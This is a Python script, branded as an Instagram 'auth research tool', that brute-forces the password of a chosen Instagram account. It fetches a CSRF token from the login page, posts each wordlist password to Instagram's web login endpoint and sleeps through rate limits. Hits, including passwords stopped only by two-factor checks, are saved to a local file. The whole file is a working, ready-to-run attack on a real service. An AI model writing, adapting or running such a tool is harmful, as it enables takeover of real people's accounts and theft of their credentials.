import requests
import time
import re
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_logo():
    logo = """
    #######################################################
    #                                                     #
    #   ███████╗ █████╗ ██╗███████╗ █████╗ ██╗            #
    #   ██╔════╝██╔══██╗██║██╔════╝██╔══██╗██║            #
    #   █████╗  ███████║██║███████╗███████║██║            #
    #   ██╔══╝  ██╔══██║██║╚════██║██╔══██║██║            #
    #   ██║     ██║  ██║██║███████║██║  ██║███████╗      #
    #   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      #
    #                                                     #
    #                [ BY: FAISAL SCRIPT ]                #
    #           [ SECURITY RESEARCH TOOL 2026 ]           #
    #######################################################
    """
    print(logo)

def start_faisal_script():
    clear_screen()
    print_logo()
    
    print("\n[+] Faisal IG Auth Research Tool")
    target_user = input("👤 Target Username: ")
    file_path = input("📂 Wordlist Path (e.g., rockyou.txt): ")

    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-ig-app-id': '936619743392459',
        'x-requested-with': 'XMLHttpRequest'
    })

    print(f"\n[*] Initializing session for {target_user}...")
    
    try:
        response = session.get("https://www.instagram.com/accounts/login/")
        csrf = re.search('\"csrf_token\":\"(.*?)\"', response.text).group(1)
        session.headers.update({'x-csrftoken': csrf})
        print("[+] Security Token Acquired. Starting...\n")
    except Exception:
        print("❌ Error: Connection refused by server. Check your IP/VPN.")
        return

    try:
        with open(file_path, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                if not password: continue
                
                print(f"🔎 [Testing]: {password}")
                
                timestamp = int(time.time())
                payload = {
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
                    'username': target_user,
                    'queryParams': {},
                    'optIntoOneTap': 'false'
                }
                
                login_url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
                res = session.post(login_url, data=payload)
                
                try:
                    result = res.json()
                    if result.get('authenticated') == True:
                        print(f"\n✨ [SUCCESS!] Password found: {password}")
                        with open("found.txt", "a") as out:
                            out.write(f"User: {target_user} | Pass: {password}\n")
                        break
                    elif 'checkpoint_url' in result:
                        print(f"🔒 Correct Pass: {password} (Blocked by 2FA)")
                        break
                    elif result.get('status') == 'fail':
                        msg = result.get('message', 'Failed')
                        print(f"❌ Failed: {msg}")
                        if "wait" in msg.lower():
                            print("⏳ Rate limited. Sleeping for 5 minutes...")
                            time.sleep(300)
                except:
                    print(f"❓ Unexpected response. HTTP {res.status_code}")

                time.sleep(40) 

    except FileNotFoundError:
        print(f"❌ Error: File not found at {file_path}")
    except Exception as e:
        print(f"💥 Unexpected Error: {e}")

if __name__ == "__main__":
    start_faisal_script()
